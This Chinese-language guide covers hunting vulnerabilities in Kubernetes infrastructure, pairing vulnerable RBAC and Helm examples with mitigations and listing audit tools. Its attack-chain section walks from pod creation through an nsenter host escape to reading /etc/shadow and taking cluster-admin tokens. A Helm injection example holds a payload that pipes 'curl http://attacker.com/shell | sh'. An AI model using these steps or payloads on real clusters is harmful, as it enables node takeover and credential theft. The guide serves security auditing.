---
description: 在基础设施中狩猎漏洞的方法论：RBAC、特权容器、hostPath 遍历、模板注入、SSRF 与供应链投毒。
tags: [infra, kubernetes, vulnerability-hunting, rbac, supply-chain]
---

# 基础设施漏洞狩猎 (Vuln Hunter)

## 1. 专家直觉触发器 (Triggers)

专家在审计基础设施安全时，会立即对以下模式产生警觉：

- **RBAC 过度授权**：`ClusterRole` 绑定了通配符 `resources: ["*"]` 与 `verbs: ["*"]`，或普通用户拥有 `create pods` 与 `pods/exec`。
- **特权容器创建路径**：发现任何角色允许创建带有 `securityContext.privileged: true` 的 Pod，且未受 `PodSecurity` 准入限制。
- **hostPath 挂载到敏感目录**：Pod 规格中出现 `hostPath` 指向 `/etc`、`/var/run/docker.sock`、`/root/.ssh` 或 `/proc`。
- **模板注入痕迹**：Helm Chart 或 Terraform 模板中将用户输入直接拼接进字符串，未使用转义或沙箱渲染。
- **SSRF 到云元数据**：Pod 内或 Webhook 配置中出现可配置的 URL，且集群网络未禁止访问 `169.254.169.254`。
- **供应链投毒迹象**：镜像引用使用 `latest` 标签，Chart 依赖使用 `http://` 而非 `https://`，且未配置 `verify` 选项。

这些触发器指向的攻击面往往是“设计即漏洞”——功能本身在缺乏约束时即为武器。

## 2. 不可跳过的问题链 (Question Chain)

在开始狩猎前，必须回答：

1. **当前身份的权限边界是什么？**  
   使用 `kubectl auth can-i --list` 枚举所有允许的操作。是否存在隐性的 `escalate` 或 `bind` 权限？
2. **哪些 Controller 会响应我创建的资源？**  
   创建 Deployment 时，是否有自定义 Operator 读取 annotation 并执行外部命令？Webhook 是否会被触发？
3. **我能控制哪些会被渲染为代码的字段？**  
   annotation、label、ConfigMap 数据、Helm values，是否会被注入 Go Template、Jinja2 或 Shell 命令？
4. **集群是否允许创建特权工作负载？**  
   `PodSecurityStandard` 的级别是 `restricted`、`baseline` 还是未启用？是否有例外命名空间（如 `kube-system`）？
5. **从集群内部出发，网络边界在哪里？**  
   是否能访问云元数据 IP？是否能访问内部仓库、镜像仓库、Terraform State 后端？是否有 NetworkPolicy 隔离？
6. **供应链上的每个组件是否经过校验？**  
   镜像签名、Chart Provenance、Terraform 模块版本锁定，是否存在于 CI/CD 流水线中？

## 3. 攻击链闭合 (Attack Chain Closure)

漏洞狩猎的核心是证明“一个低权限动作能引发高权限后果”。以下是 RBAC 到集群接管的最小闭环：

**前提**：命名空间 `dev` 中的 `ServiceAccount` 拥有 `create` 权限的 `Role`，可创建 Pod 与 ConfigMap。

**狩猎步骤 1（权限发现）**：执行 `kubectl auth can-i create pods --as=system:serviceaccount:dev:default -n dev`，返回 `yes`。
**狩猎步骤 2（策略探测）**：尝试创建包含 `hostPath` 的 Pod。若 API Server 拒绝并返回 `Forbidden: pod violates PodSecurity`，则尝试利用已知的“豁免命名空间”或寻找允许创建 `Pod` 但不检查安全上下文的自定义资源（如某些 CRD 的 `Workload`）。
**狩猎步骤 3（武器化）**：一旦确认可创建特权 Pod，构造 `hostPID: true` + `hostPath: /` 的 YAML。通过 `kubectl apply` 下发。
**狩猎步骤 4（验证逃逸）**：进入容器执行 `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash`。若能读取宿主的 `/etc/shadow`，则证明沙箱逃逸成功。
**狩猎步骤 5（横向与纵向移动）**：在宿主上读取 kubelet 凭证，通过 API Server 查询 secrets。若发现 `cluster-admin` token，则完成权限提升闭环。

**逻辑证明**：如果 `create pods` 权限未被安全策略约束，则攻击者必然可以构造等价于宿主 root 的执行环境。因此，**无约束的 Pod 创建权限 = 节点 root 权限**。

## 4. 代码示例 (Code Examples)

### 4.1 危险的 RBAC 配置（漏洞模式）

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: dangerous-role
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

**风险**：`*` 通配符意味着任何用户绑定此角色后，可读取所有 Secret、修改所有 RBAC、创建特权 Pod。

### 4.2 最小可逃逸 RBAC（漏洞模式）

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-creator
  namespace: dev
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create", "get", "list"]
```

**风险**：即使仅允许创建 Pod，若未启用准入控制，仍可创建 `privileged: true` 的 Pod，等同于授予节点 root。

### 4.3 安全的 RBAC 配置（缓解模式）

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: limited-deployer
  namespace: dev
rules:
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["create", "update", "get"]
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
  resourceNames: ["my-app-*"]
```

**缓解**：限制动词与资源名称，禁止直接创建裸 Pod，强制通过受控的 Deployment 控制器下发。

### 4.4 Helm 模板注入漏洞（漏洞模式）

```yaml
# templates/configmap.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: config
data:
  script.sh: |
    #!/bin/sh
    echo "Hello {{ .Values.user.name }}"
```

若攻击者在 `values.yaml` 中设置：

```yaml
user:
  name: '"; curl http://attacker.com/shell | sh; #'
```

则生成的 ConfigMap 包含恶意 Shell 代码。若 Controller 将此 ConfigMap 挂载并执行，则导致节点 RCE。

### 4.5 安全的 Helm 模板（缓解模式）

```yaml
# templates/configmap.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: config
data:
  script.sh: |
    #!/bin/sh
    echo "Hello {{ .Values.user.name | htmlEscape | quote }}"
```

**缓解**：在模板中使用 `quote`、`htmlEscape` 或 `sprig` 安全函数，禁止用户输入破坏代码结构。

## 5. 狩猎工具链

专家在基础设施漏洞狩猎中，通常组合使用以下工具形成闭环：

- **权限枚举**：`kubectl auth can-i --list`、`who-can`（kubectl-who-can 插件）
- **配置审计**：`kube-bench`（CIS 基线）、`kube-hunter`（渗透测试）
- **镜像扫描**：`trivy image`、`snyk container`
- **网络探测**：`nmap` 从 Pod 内部扫描、`curl` 探测元数据端点
- **策略验证**：`kyverno apply`、`opa test`
- **代码静态分析**：`semgrep` 规则集扫描 Helm Chart 和 Controller 源码

```bash
# 示例：使用 kubectl-who-can 枚举所有能创建特权 Pod 的主体
kubectl who-can create pods --all-namespaces --subresource="*" | grep -i "privileged"
```

**说明**：工具链的价值在于将手工审计转化为可重复的自动化流程。每次集群升级或新应用部署后，都应重新运行完整工具链，防止配置漂移引入新的攻击面。
